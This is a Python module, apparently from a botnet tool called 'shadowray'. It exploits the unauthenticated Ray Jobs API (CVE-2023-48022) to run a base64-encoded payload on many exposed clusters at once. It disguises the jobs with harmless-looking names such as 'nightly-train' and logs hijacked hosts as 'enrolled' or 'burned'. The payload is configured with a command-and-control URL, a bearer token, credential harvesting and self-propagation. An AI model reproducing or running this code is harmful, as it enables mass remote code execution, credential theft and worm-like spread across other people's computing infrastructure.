import base64
import logging
import random
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, Optional

import requests

from .ledger import Ledger
from .payload_src import build_payload

_NGROK_HEADERS = {"ngrok-skip-browser-warning": "true"}

log = logging.getLogger("shadowray.enroll")

JOB_NAMES = ["team-training-run", "hyperparam-sweep", "distil-finetune",
             "eval-benchmark", "data-prep", "resume-checkpoint", "nightly-train"]

RETRY_DELAYS = [2, 4, 8, 16, 32]  # exponential backoff, Section 2.6


def submit_job(ip: str, port: int, payload_src: str, timeout: float = 30.0,
              dry_run: bool = False) -> Optional[str]:
    """Submit payload as a Ray job via the unauthenticated Jobs API (CVE-2023-48022)."""
    base = f"http://{ip}:{port}"
    b64 = base64.b64encode(payload_src.encode()).decode()
    entrypoint = f"python -c \"import base64;exec(base64.b64decode('{b64}').decode())\""
    name = random.choice(JOB_NAMES)
    body = {
        "entrypoint": entrypoint,
        "job_id": f"{name}-{random.randint(10000,99999)}",
        "metadata": {"job_name": name, "submission_mode": "oneoff"},
    }
    if dry_run:
        log.info("[DRY-RUN] would submit to %s:%s job=%s", ip, port, body["job_id"])
        return body["job_id"]
    for delay in RETRY_DELAYS:
        try:
            r = requests.post(f"{base}/api/jobs/", json=body, timeout=timeout, headers=_NGROK_HEADERS)
            if r.status_code in (200, 201):
                jid = r.json().get("job_id") or body["job_id"]
                log.info("[+] ENROLLED %s:%s job=%s (%s)", ip, port, jid, name)
                return jid
            # some Ray versions accept submit in dashboard /api/jobs/submit style
            if r.status_code == 404:
                r2 = requests.post(f"{base}/api/jobs/submit", json=body, timeout=timeout, headers=_NGROK_HEADERS)
                if r2.ok:
                    jid = r2.json().get("job_id") or body["job_id"]
                    log.info("[+] ENROLLED (v1 path) %s:%s job=%s", ip, port, jid)
                    return jid
            log.warning("submit %s:%s -> %s %s", ip, port, r.status_code, r.text[:200])
        except Exception as e:
            log.debug("submit error %s:%s %s", ip, port, e)
        time.sleep(delay + random.random() * 2)
    return None


def job_status(ip: str, port: int, job_id: str, timeout: float = 15.0) -> Optional[Dict[str, Any]]:
    try:
        r = requests.get(f"http://{ip}:{port}/api/jobs/{job_id}", timeout=timeout)
        return r.json() if r.ok else None
    except Exception:
        return None


def job_logs(ip: str, port: int, job_id: str, timeout: float = 20.0) -> Optional[str]:
    try:
        r = requests.get(f"http://{ip}:{port}/api/jobs/{job_id}/logs", timeout=timeout)
        return r.text if r.ok else None
    except Exception:
        return None


def enroll_all(cfg: Dict[str, Any], ledger: Ledger, clusters: list = None) -> int:
    """Submit the payload to every live, non-burned cluster in the ledger."""
    if clusters is None:
        clusters = ledger.list_clusters(only_alive=True)
    clusters = [c for c in clusters if c.get("status") != "burned"]
    if not clusters:
        log.warning("no live clusters to enroll")
        return 0
    payload = build_payload(
        cfg["c2_url"], cfg["c2_bearer"], tag="venom",
        harvest=cfg["harvest_credentials"], propagate=cfg["propagate"],
        max_cycles=cfg["max_work_cycles"],
    )
    enrolled = 0
    with ThreadPoolExecutor(max_workers=cfg["enroll_concurrency"]) as ex:
        futs = {}
        for c in clusters:
            futs[ex.submit(submit_job, c["ip"], c["port"], payload,
                           dry_run=cfg.get("dry_run", False))] = c
        for fut in as_completed(futs):
            c = futs[fut]
            try:
                jid = fut.result()
            except Exception:
                jid = None
            if jid:
                ledger.upsert(c["ip"], c["port"], status="enrolled")
                ledger.add_job(c["ip"], c["port"], jid)
                enrolled += 1
            else:
                ledger.burned(c["ip"], c["port"], "submit_failed")  # Section 4.4
    log.info("enrolled %d/%d clusters", enrolled, len(clusters))
    return enrolled